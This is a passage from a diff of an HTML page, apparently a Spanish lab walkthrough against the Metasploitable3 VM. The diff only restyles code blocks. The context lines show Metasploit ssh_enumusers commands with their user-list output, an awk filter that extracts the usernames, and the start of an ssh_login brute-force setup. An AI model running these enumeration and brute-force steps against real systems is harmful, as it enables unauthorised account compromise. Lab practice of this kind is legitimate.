@@ -158,13 +158,13 @@
 <p>Obtenemos la siguiente información:</p>
 <p><img src="/images/metasploitable3/nmap_meta.png" alt="nmap_meta.png"></p>
 <p>Como podemos ver, el puerto está abierto. Ahora usaremos un módulo auxiliar que está instalado en Kali Linux para conseguir toda la lista de usuarios que hay creados en la máquina objetivo. Seguimos los siguientes pasos:</p>
-<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">msfconsole
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">msfconsole
 use auxiliary/scanner/ssh/ssh_enumusers
 set RHOSTS 192.168.122.254
 set USER_FILE /usr/share/wordlists/metasploit/unix_users.txt
 run
 </code></pre></div><p>Con esto, tras acabar el módulo, obtenemos la siguiente lista de usuarios:</p>
-<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">[*] 192.168.122.254:22 - SSH - Using malformed packet technique
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">[*] 192.168.122.254:22 - SSH - Using malformed packet technique
 [*] 192.168.122.254:22 - SSH - Starting scan
 [+] 192.168.122.254:22 - SSH - User &#39;4Dgifts&#39; found
 [+] 192.168.122.254:22 - SSH - User &#39;abrt&#39; found
@@ -339,7 +339,7 @@ run
 <p><code>cat listausr.txt | awk '{print $7}' &gt; listafinal.txt</code></p>
 <p>Este comando hará que la lista anterior (que hemos añadido al fichero <em>listausr.txt</em>), se traspase a otro fichero dejando únicamente los usuarios (es posible que haya que eliminar las comillas que queden).</p>
 <p>Obtenido el fichero <em>listafinal.txt</em>, haremos uso de otro módulo de Kali Linux que nos permitirá realizar el ataque de fuerza bruta a través de ssh. Para la ejecución del ataque seguiremos los siguientes pasos:</p>
-<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">msfconsole
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">msfconsole
 use auxiliary/scanner/ssh/ssh_login
 set RHOSTS 192.168.122.254
 set USER_AS_PASS true
